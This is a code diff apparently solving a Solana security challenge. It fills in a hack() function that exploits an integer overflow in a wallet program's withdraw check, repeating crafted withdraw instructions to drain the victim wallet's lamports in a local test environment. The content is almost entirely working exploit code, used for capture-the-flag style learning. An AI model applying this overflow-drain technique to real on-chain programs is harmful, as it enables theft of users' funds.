@@ -8,6 +8,7 @@ use poc_framework::{
 use solana_program::native_token::lamports_to_sol;
 
 use pocs::assert_tx_success;
+use solana_program::rent::Rent;
 use solana_program::{native_token::sol_to_lamports, pubkey::Pubkey, system_program};
 
 struct Challenge {
@@ -18,7 +19,53 @@ struct Challenge {
 }
 
 // Do your hacks in this function here
-fn hack(_env: &mut LocalEnvironment, _challenge: &Challenge) {}
+fn hack(env: &mut LocalEnvironment, challenge: &Challenge) {
+    // Create hacker's wallet
+    assert_tx_success(env.execute_as_transaction(
+        &[level2::initialize(
+            challenge.wallet_program,
+            challenge.hacker.pubkey(),
+        )],
+        &[&challenge.hacker],
+    ));
+
+    let rent = Rent::default();
+    let min_balance = rent.minimum_balance(level2::WALLET_LEN as usize);
+
+    let overflow_amount = u64::MAX - min_balance + 1000;
+    println!(
+        "[*] min_balance + amount = {}",
+        min_balance.wrapping_add(overflow_amount)
+    );
+    println!(
+        "[*] steal amount per instruction = {}",
+        lamports_to_sol(u64::MAX - overflow_amount + 1)
+    );
+
+    let instructions: Vec<_> = std::iter::repeat(level2::withdraw(
+        challenge.wallet_program,
+        challenge.hacker.pubkey(),
+        challenge.wallet_address,
+        overflow_amount,
+    ))
+    .take(40)
+    .collect();
+
+    for _ in 0..30 {
+        assert_tx_success(env.execute_as_transaction(&instructions, &[&challenge.hacker]));
+        env.advance_blockhash();
+    }
+
+    assert_tx_success(env.execute_as_transaction(
+        &[level2::withdraw(
+            challenge.wallet_program,
+            challenge.hacker.pubkey(),
+            challenge.hacker.pubkey(),
+            sol_to_lamports(1.0),
+        )],
+        &[&challenge.hacker],
+    ));
+}
 
 /*
 SETUP CODE BELOW
